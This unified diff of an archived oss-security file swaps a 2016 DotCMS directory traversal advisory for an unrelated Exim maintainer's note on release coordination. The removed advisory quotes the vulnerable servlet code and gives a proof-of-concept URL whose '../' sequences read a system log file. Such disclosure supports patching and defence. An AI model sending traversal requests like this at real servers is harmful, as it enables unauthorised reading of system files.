@@ -1,172 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/08/1
-Message-ID: <CAA0JNpTZm42a_6D4TdOb=8H56y7dd-fewOCg3CmCA-a8TN=e8g@mail.gmail.com>
-Date: Fri, 8 Apr 2016 11:07:35 +0800
-From: xiong piaox <yahoo860201@...il.com>
-To: fulldisclosure@...lists.org
-Cc: bugs@...uritytracker.com, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
-Subject: [CVE-2016-3972]DotCMS Directory traversal vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/22/6
+Message-ID: <20161222104035.GE5082@jumper.schlittermann.de>
+Date: Thu, 22 Dec 2016 11:40:35 +0100
+From: Heiko Schlittermann <hs@...littermann.de>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2016-9963 Exim private information leak
 Content-Type: text/plain; charset=utf-8
 
-Advisory: DotCMS Directory traversal vulnerability
-
-Author: Piaox From Pingan Product Safety Group
-
-Email: xiongyaofu351@...gan.com.cn
-
-Affected Version: dotCMS 3.5 Beta(the latest version)
-
-
-
-==========================
-
-Vulnerability Description
-
-Recetly, I found a Directory traversal vulnerability in ‘DotCMS'
-program,  DotCMS is widely used in many companies.
-
-
-
-Vulnerable file is: “com.dotmarketing.servlets.taillog.TailLogServlet.class”
-
-File file = *null*;
-
-    String tailLogLofFolder = *Config*.*getStringProperty*(
-"TAIL_LOG_LOG_FOLDER", "./dotsecure/logs/");
-
-    *try*
-
-    {
-
-      *if* (!tailLogLofFolder.endsWith(File.separator)) {
-
-        tailLogLofFolder = tailLogLofFolder + File.separator;
-
-      }
-
-      file = *new* File(*FileUtil*.*getAbsolutlePath*(tailLogLofFolder +
-fileName));
-
-    }
-
-    *catch* (Exception e)
-
-    {
-
-      *Logger*.*error*(getClass(), "unable to open log file '" +
-tailLogLofFolder + fileName + "' please set the config variable
-TAIL_LOG_LOG_FOLDER correctly");
-
-    }
-
-    *if* ((file == *null*) || (!file.exists()))
-
-    {
-
-      response.sendError(403);
-
-      *AdminLogger*.*log*(*TailLogServlet*.*class*, "service", "Someone
-tried to use the TailLogServlet to display a file not in the logs directory"
-);
-
-      *return*;
-
-    }
-
-    String regex = *Config*.*getStringProperty*("TAIL_LOG_FILE_REGEX");
-
-//WEB-INF/classes/dotmarketing-config.properties:TAIL_LOG_FILE_REGEX=.*\.log$|.*\.out$
-
-    *if* (!*UtilMethods*.*isSet*(regex)) {
-
-      regex = "!.*";
-
-    }
-
-*if* (!Pattern.compile(regex).matcher(fileName).matches()) {
-
-//Only detects whether the file extension .log end,lead ，caused Directory
-traversal vulnerability.
-
-      *return*;
-
-    }
-
-    response.setContentType("text/html;charset=UTF-8");
-
-
-
-    ServletOutputStream out = response.getOutputStream();
-
-
-
-    out.print("<html><head><title>dotCMS Log</title><style
-type='text/css'>@import '/html/css/dot_admin.css';</style><script>var
-working =false;function
-doS(){if(!working){working=true;if(parent.document.getElementById('scrollMe').checked){dh=document.body.scrollHeight;ch=document.body.clientHeight;if(dh>ch){moveme=dh-ch;window.scrollTo(0,moveme);}}working=false;}}</script></head><body
-class='tailerBody'>");
-
-
-
-    out.flush();
-
-
-
-    *Tailer* tailer = *null*;
-
-    *long* startPosition = file.length() - 5000L < 0L ? 0L : file.length()
-- 5000L;
-
-
-
-    *MyTailerListener* listener = *new* MyTailerListener(*null*);
-
-    listener.*handle*("Tailing " + fileName);
-
-    listener.*handle*("----------------------------- ");
-
-    tailer = *new* *Tailer*(file, listener, 1000L);
-
-    tailer.*setStartPosition*(startPosition);
-
-    *MyTailerThread* thread = *new* *MyTailerThread*(tailer);
-
-
-
-    String name = *null*;
-
-    *for* (*int* i = 0; i < 1000; i++)
-
-    {
-
-      name = "LogTailer" + i + ":" + fileName;
-
-      Thread t = *ThreadUtils*.*getThread*(name);
-
-      *if* (t == *null*) {
-
-        *break*;
-
-      }
-
-      *if* (i > 100) {
-
-        *throw* *new* ServletException("Too many Logger threads");
-
-      }
-
-    }
-
-
-
-==========================
-
-POC && EXP
-
-==========================
-
-1. Login
-
-2.
-http://localhost:8080/dotTailLogServlet/?fileName=../../../../../../../../var/log/system.log
-
+Kurt H Maier <khm@...ops.net> (Do 22 Dez 2016 01:57:33 CET):
+> On Thu, Dec 22, 2016 at 12:24:09AM +0100, Heiko Schlittermann wrote:
+> > 
+> > In case the distros are ready already, we could release on 23rd, but I
+> > need feedbeck from the distros and ack from the other developers.
+> > 
+> Please pursue this possibility.
+
+Ok, I asked the distro@vs… list to get clearance. If the major distros
+supporting Exim give their ok, we're prepared to release sooner. Stay
+tuned.
+
+    Best regards from Dresden/Germany
+    Viele Grüße aus Dresden
+    Heiko Schlittermann
+-- 
+ SCHLITTERMANN.de ---------------------------- internet & unix support -
+ Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
+ gnupg encrypted messages are welcome --------------- key ID: F69376CE -
+ ! key id 7CBF764A and 972EAC9F are revoked since 2015-01 ------------ -
+
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
